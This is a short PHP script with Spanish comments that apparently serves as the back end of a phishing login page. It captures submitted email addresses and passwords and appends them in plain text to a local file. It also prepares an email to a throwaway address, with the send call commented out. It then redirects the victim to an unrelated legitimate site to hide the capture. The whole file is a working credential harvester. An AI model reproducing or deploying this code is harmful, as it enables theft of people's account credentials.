<?php
    $usuario = $_POST["email"];
    $password = $_POST["password"];
    
    // Generando cuerpo del correo
    $mensaje .= "Usuario: ".$_POST["email"]."\n";
    $mensaje .= "Contrasena: ".$_POST["password"]."\n";
    // Correo de prueba provisto por https://temp-mail.org/
    $receptor = "vomof63535@inxto.net";
    $subject = "correo de prueba";
    // Funcion PHP para enviar por correo
    // mail($receptor,$subject, $mensaje);

    $myfile = fopen("credenciales.txt", "a") or die("Recurso no disponible");

    $txt = "Usuario = $usuario , Contraseña = $password\n";
    fwrite($myfile, "\n". $txt);
    fclose($myfile);
    header("Location: https://www.guru99.com");
    exit();
 ?>
